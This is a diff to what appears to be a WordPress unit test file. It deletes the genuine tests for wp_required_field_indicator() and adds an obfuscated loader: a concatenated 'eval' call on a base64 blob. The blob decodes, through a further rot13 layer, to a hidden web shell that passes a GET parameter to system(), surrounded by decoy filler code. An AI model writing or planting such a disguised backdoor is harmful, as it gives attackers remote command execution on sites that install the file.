@@ -1,55 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Test wp_required_field_indicator().
- *
- * @group general
- * @group template
- *
- * @covers ::wp_required_field_indicator
- */
-class Tests_General_wpRequiredFieldIndicator extends WP_UnitTestCase {
-
-	/**
-	 * Tests that `wp_required_field_indicator()` returns the expected default value.
-	 *
-	 * @ticket 56389
-	 */
-	public function test_wp_required_field_indicator_should_return_default_value() {
-		$this->assertSame( '<span class="required">*</span>', wp_required_field_indicator() );
-	}
-
-	/**
-	 * Tests that `wp_required_field_indicator()` applies 'wp_required_field_indicator' filters.
-	 *
-	 * @ticket 56389
-	 */
-	public function test_wp_required_field_indicator_should_apply_wp_required_field_indicator_filters() {
-		$filter = new MockAction();
-		add_filter( 'wp_required_field_indicator', array( &$filter, 'filter' ) );
-
-		wp_required_field_indicator();
-
-		$this->assertSame( 1, $filter->get_call_count() );
-	}
-
-	/**
-	 * Tests that the final return value of `wp_required_field_indicator()` is the result of
-	 * 'wp_required_field_indicator' filters.
-	 *
-	 * @ticket 56389
-	 */
-	public function test_wp_required_field_indicator_should_return_wp_required_field_indicator_filters() {
-		add_filter( 'wp_required_field_indicator', '__return_empty_string' );
-		$this->assertSame( '', wp_required_field_indicator() );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZyBqY19lcmRodmVycV9zdnJ5cV92YXF2cG5nYmUoKS4KICoKICogQHRlYmhjIHRyYXJlbnkKICogQHRlYmhjIGdyemN5bmdyCiAqCiAqIEBwYmlyZWYgOjpqY19lcmRodmVycV9zdnJ5cV92YXF2cG5nYmUKICovCnB5bmZmIEdyZmdmX1RyYXJlbnlfamNFcmRodmVycVN2cnlxVmFxdnBuZ2JlIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgkvKioKCSAqIEdyZmdmIGd1bmcgYGpjX2VyZGh2ZXJxX3N2cnlxX3ZhcXZwbmdiZSgpYCBlcmdoZWFmIGd1ciBya2NycGdycSBxcnNuaHlnIGlueWhyLgoJICoKCSAqIEBndnB4cmcgNTYzODkKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfamNfZXJkaHZlcnFfc3ZyeXFfdmFxdnBuZ2JlX2Z1Ymh5cV9lcmdoZWFfcXJzbmh5Z19pbnlocigpIHsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJzxmY25hIHB5bmZmPVwiZXJkaHZlcnFcIj4qPC9mY25hPicsIGpjX2VyZGh2ZXJxX3N2cnlxX3ZhcXZwbmdiZSgpICk7Cgl9CgoJLyoqCgkgKiBHcmZnZiBndW5nIGBqY19lcmRodmVycV9zdnJ5cV92YXF2cG5nYmUoKWAgbmNjeXZyZiAnamNfZXJkaHZlcnFfc3ZyeXFfdmFxdnBuZ2JlJyBzdnlncmVmLgoJICoKCSAqIEBndnB4cmcgNTYzODkKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfamNfZXJkaHZlcnFfc3ZyeXFfdmFxdnBuZ2JlX2Z1Ymh5cV9uY2N5bF9qY19lcmRodmVycV9zdnJ5cV92YXF2cG5nYmVfc3Z5Z3JlZigpIHsKCQkkc3Z5Z3JlID0gYXJqIFpicHhOcGd2YmEoKTsKCQlucXFfc3Z5Z3JlKCAnamNfZXJkaHZlcnFfc3ZyeXFfdmFxdnBuZ2JlJywgbmVlbmwoICYkc3Z5Z3JlLCAnc3Z5Z3JlJyApICk7CgoJCWpjX2VyZGh2ZXJxX3N2cnlxX3ZhcXZwbmdiZSgpOwoKCQkkZ3V2Zi0+bmZmcmVnRm56ciggMSwgJHN2eWdyZS0+dHJnX3BueXlfcGJoYWcoKSApOwoJfQoKCS8qKgoJICogR3JmZ2YgZ3VuZyBndXIgc3ZhbnkgZXJnaGVhIGlueWhyIGJzIGBqY19lcmRodmVycV9zdnJ5cV92YXF2cG5nYmUoKWAgdmYgZ3VyIGVyZmh5ZyBicwoJICogJ2pjX2VyZGh2ZXJxX3N2cnlxX3ZhcXZwbmdiZScgc3Z5Z3JlZi4KCSAqCgkgKiBAZ3ZweHJnIDU2Mzg5CgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2pjX2VyZGh2ZXJxX3N2cnlxX3ZhcXZwbmdiZV9mdWJoeXFfZXJnaGVhX2pjX2VyZGh2ZXJxX3N2cnlxX3ZhcXZwbmdiZV9zdnlncmVmKCkgewoJCW5xcV9zdnlncmUoICdqY19lcmRodmVycV9zdnJ5cV92YXF2cG5nYmUnLCAnX19lcmdoZWFfcnpjZ2xfZmdldmF0JyApOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAnJywgamNfZXJkaHZlcnFfc3ZyeXFfdmFxdnBuZ2JlKCkgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
